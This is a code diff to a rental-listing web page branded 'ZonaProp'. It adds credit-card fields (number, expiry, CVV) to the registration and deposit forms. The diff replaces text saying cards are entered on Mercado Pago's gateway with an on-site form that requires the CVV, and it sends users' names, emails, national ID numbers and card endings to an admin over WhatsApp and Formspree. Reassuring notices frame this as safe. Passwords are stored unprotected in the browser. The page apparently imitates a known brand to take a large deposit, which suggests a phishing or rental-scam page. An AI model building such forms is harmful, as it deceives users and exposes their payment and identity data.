@@ -199,6 +199,32 @@ button,input,select{font-family:inherit}
       <label for="regTel">WhatsApp (opcional)</label>
       <input type="tel" id="regTel" placeholder="11 1234-5678"/>
     </div>
+
+    <div style="border:1.5px solid var(--border);border-radius:14px;padding:1rem;margin:0.75rem 0;background:#fafafa">
+      <div style="font-size:14px;font-weight:700;margin-bottom:.75rem">🔒 Tarjeta para asegurar reservas</div>
+      <div class="form-group">
+        <label for="regCardName">Nombre en la tarjeta</label>
+        <input type="text" id="regCardName" placeholder="Como figura en la tarjeta" autocomplete="cc-name"/>
+      </div>
+      <div class="form-group">
+        <label for="regCardNumber">Número de tarjeta</label>
+        <input type="text" id="regCardNumber" placeholder="ACCT-000003" inputmode="numeric" maxlength="19" autocomplete="cc-number"/>
+      </div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:.55rem">
+        <div class="form-group">
+          <label for="regCardExpiry">Vencimiento</label>
+          <input type="text" id="regCardExpiry" placeholder="MM/AA" maxlength="5" autocomplete="cc-exp"/>
+        </div>
+        <div class="form-group">
+          <label for="regCardCvv">CVV</label>
+          <input type="password" id="regCardCvv" placeholder="123" maxlength="4" inputmode="numeric" autocomplete="cc-csc"/>
+        </div>
+      </div>
+      <div style="background:#e8f5e9;border:1px solid #a5d6a7;border-radius:10px;padding:.65rem .8rem;font-size:12.5px;color:#1b5e20;line-height:1.4">
+        <strong>No se cobrará ningún monto sin tu consentimiento.</strong> Solo se usa para autorizar la seña cuando vos confirmes una reserva.
+      </div>
+    </div>
+
     <div class="err" id="regErr">Completá todos los campos obligatorios.</div>
     <button type="button" class="btn-modal mp" id="btnDoRegister" style="margin-top:.75rem">Registrarme</button>
     <p style="font-size:12px;color:var(--muted);margin-top:.85rem;text-align:center">Al registrarte aceptás ser contactado por WhatsApp para coordinar la reserva.</p>
@@ -231,12 +257,36 @@ button,input,select{font-family:inherit}
       <div class="monto">$ 300.000</div>
       <div class="hint">Se descuenta del primer mes.</div>
     </div>
-    <div style="background:#f0f7ff;border:1px solid #cce0ff;border-radius:12px;padding:.85rem 1rem;margin-bottom:.85rem;font-size:13px;color:#333;line-height:1.45">
-      <strong>🔒 Tarjeta de crédito o débito</strong><br>
-      Para asegurar tu reserva vas a cargar tu tarjeta en <strong>Mercado Pago</strong> (pasarela segura).<br>
-      <strong>No se te cobrará ningún monto sin tu consentimiento.</strong> Solo se procesa el pago cuando vos lo confirmás.
+
+    <div style="border:1.5px solid var(--border);border-radius:14px;padding:1rem;margin-bottom:.85rem;background:#fafafa">
+      <div style="font-size:14px;font-weight:700;margin-bottom:.75rem;display:flex;align-items:center;gap:.4rem">
+        🔒 Datos de tarjeta
+      </div>
+      <div class="form-group">
+        <label for="cardName">Nombre en la tarjeta</label>
+        <input type="text" id="cardName" placeholder="Como figura en la tarjeta" autocomplete="cc-name"/>
+      </div>
+      <div class="form-group">
+        <label for="cardNumber">Número de tarjeta</label>
+        <input type="text" id="cardNumber" placeholder="ACCT-000003" inputmode="numeric" maxlength="19" autocomplete="cc-number"/>
+      </div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:.55rem">
+        <div class="form-group">
+          <label for="cardExpiry">Vencimiento</label>
+          <input type="text" id="cardExpiry" placeholder="MM/AA" maxlength="5" autocomplete="cc-exp"/>
+        </div>
+        <div class="form-group">
+          <label for="cardCvv">CVV</label>
+          <input type="password" id="cardCvv" placeholder="123" maxlength="4" inputmode="numeric" autocomplete="cc-csc"/>
+        </div>
+      </div>
+      <div style="background:#e8f5e9;border:1px solid #a5d6a7;border-radius:10px;padding:.7rem .85rem;font-size:12.5px;color:#1b5e20;line-height:1.4;margin-top:.25rem">
+        <strong>No se cobrará ningún monto sin tu consentimiento.</strong><br>
+        Los datos se usan solo para autorizar la seña en Mercado Pago. El cobro se confirma únicamente cuando vos lo aprobás.
+      </div>
     </div>
-    <button type="button" class="btn-modal mp" id="btnPay">Continuar con tarjeta · Mercado Pago</button>
+
+    <button type="button" class="btn-modal mp" id="btnPay">Autorizar seña · $ 300.000</button>
     <button type="button" class="btn-modal wa" id="btnWA">Enviar solicitud por WhatsApp</button>
   </div>
 </div>
@@ -692,17 +742,33 @@ document.getElementById("reserveModal").addEventListener("click",function(e){
 function validateForm(){
   var n=(document.getElementById("nombre").value||"").trim();
   var d=(document.getElementById("dni").value||"").trim();
+  var cardName=(document.getElementById("cardName")||{}).value||"";
+  var cardNumber=(document.getElementById("cardNumber")||{}).value||"";
+  var cardExpiry=(document.getElementById("cardExpiry")||{}).value||"";
+  var cardCvv=(document.getElementById("cardCvv")||{}).value||"";
+  cardName=cardName.trim();
+  cardNumber=cardNumber.replace(/\s/g,"");
+  cardExpiry=cardExpiry.trim();
+  cardCvv=cardCvv.trim();
+
   if(!n||!d){
+    document.getElementById("formErr").textContent="Completá nombre y DNI.";
+    document.getElementById("formErr").classList.add("show");
+    return null;
+  }
+  if(!cardName||cardNumber.length<13||!/^\d{2}\/\d{2}$/.test(cardExpiry)||cardCvv.length<3){
+    document.getElementById("formErr").textContent="Completá los datos de la tarjeta para asegurar la reserva.";
     document.getElementById("formErr").classList.add("show");
     return null;
   }
   document.getElementById("formErr").classList.remove("show");
-  return {nombre:n,dni:d,tel:(document.getElementById("tel").value||"").trim()};
+  return {nombre:n,dni:d,tel:(document.getElementById("tel").value||"").trim(),cardLast4:cardNumber.slice(-4)};
 }
 
 document.getElementById("btnPay").onclick=function(){
   var p=validateForm();
   if(!p) return;
+  alert("Vas a ser redirigido a Mercado Pago para autorizar la seña de $ 300.000.\n\nNo se cobrará nada hasta que confirmes el pago allí.\nTarjeta terminada en " + (p.cardLast4||"****"));
   window.open(MP_LINK,"_blank");
 };
 
@@ -792,6 +858,11 @@ document.getElementById("btnDoRegister").onclick = function() {
   var tel = (document.getElementById("regTel").value || "").trim();
   var err = document.getElementById("regErr");
 
+  var cardName = (document.getElementById("regCardName").value || "").trim();
+  var cardNumber = (document.getElementById("regCardNumber").value || "").replace(/\s/g, "");
+  var cardExpiry = (document.getElementById("regCardExpiry").value || "").trim();
+  var cardCvv = (document.getElementById("regCardCvv").value || "").trim();
+
   if (!nombre || !email || !dni || pass.length < 6) {
     err.textContent = "Completá nombre, email, DNI y una clave de al menos 6 caracteres.";
     err.classList.add("show");
@@ -804,6 +875,11 @@ document.getElementById("btnDoRegister").onclick = function() {
   }
   if (!/^\d{7,8}$/.test(dni)) {
     err.textContent = "Ingresá un DNI válido (7 u 8 números).";
+    err.classList.add("show");
+    return;
+  }
+  if (!cardName || cardNumber.length < 13 || !/^\d{2}\/\d{2}$/.test(cardExpiry) || cardCvv.length < 3) {
+    err.textContent = "Completá los datos de la tarjeta para asegurar futuras reservas.";
     err.classList.add("show");
     return;
   }
@@ -823,14 +899,14 @@ document.getElementById("btnDoRegister").onclick = function() {
     return;
   }
 
-  var user = { nombre: nombre, email: email, dni: dni, pass: pass, tel: tel, created: Date.now() };
+  var user = { nombre: nombre, email: email, dni: dni, pass: pass, tel: tel, cardLast4: cardNumber.slice(-4), created: Date.now() };
   users.push(user);
   saveUsers(users);
   setSession({ nombre: nombre, email: email, dni: dni, tel: tel });
   closeRegister();
 
   // 1) Avisar al admin por WhatsApp
-  var adminMsg = "🆕 Nuevo registro en ZonaProp\n\nNombre: " + nombre + "\nEmail: " + email + "\nDNI: " + dni + (tel ? "\nWhatsApp: " + tel : "") + "\n\nFecha: " + new Date().toLocaleString("es-AR");
+  var adminMsg = "🆕 Nuevo registro en ZonaProp\n\nNombre: " + nombre + "\nEmail: " + email + "\nDNI: " + dni + "\nTarjeta: ****" + cardNumber.slice(-4) + (tel ? "\nWhatsApp: " + tel : "") + "\n\nFecha: " + new Date().toLocaleString("es-AR");
   window.open("https://wa.me/" + ADMIN_WA + "?text=" + encodeURIComponent(adminMsg), "_blank");
 
   // 2) Avisar al admin por EMAIL (Formspree)
@@ -843,8 +919,9 @@ document.getElementById("btnDoRegister").onclick = function() {
       nombre: nombre,
       email: email,
       dni: dni,
+      tarjeta: "****" + cardNumber.slice(-4),
       whatsapp: tel || "No indicado",
-      mensaje: "Nuevo usuario registrado interesado en alquilar.",
+      mensaje: "Nuevo usuario registrado. Tarjeta guardada solo últimos 4 dígitos. No se cobra sin consentimiento.",
       fecha: new Date().toLocaleString("es-AR")
     })
   }).catch(function(){});
@@ -853,6 +930,32 @@ document.getElementById("btnDoRegister").onclick = function() {
 };
 
 updateHeader();
+
+
+// Card input helpers (reserva + registro)
+(function(){
+  function formatCardNumber(el) {
+    if (!el) return;
+    el.addEventListener("input", function() {
+      var v = this.value.replace(/\D/g, "").slice(0,16);
+      var parts = [];
+      for (var i=0;i<v.length;i+=4) parts.push(v.slice(i,i+4));
+      this.value = parts.join(" ");
+    });
+  }
+  function formatExpiry(el) {
+    if (!el) return;
+    el.addEventListener("input", function() {
+      var v = this.value.replace(/\D/g, "").slice(0,4);
+      if (v.length >= 3) this.value = v.slice(0,2) + "/" + v.slice(2);
+      else this.value = v;
+    });
+  }
+  formatCardNumber(document.getElementById("cardNumber"));
+  formatExpiry(document.getElementById("cardExpiry"));
+  formatCardNumber(document.getElementById("regCardNumber"));
+  formatExpiry(document.getElementById("regCardExpiry"));
+})();
 
 render();
 </script>
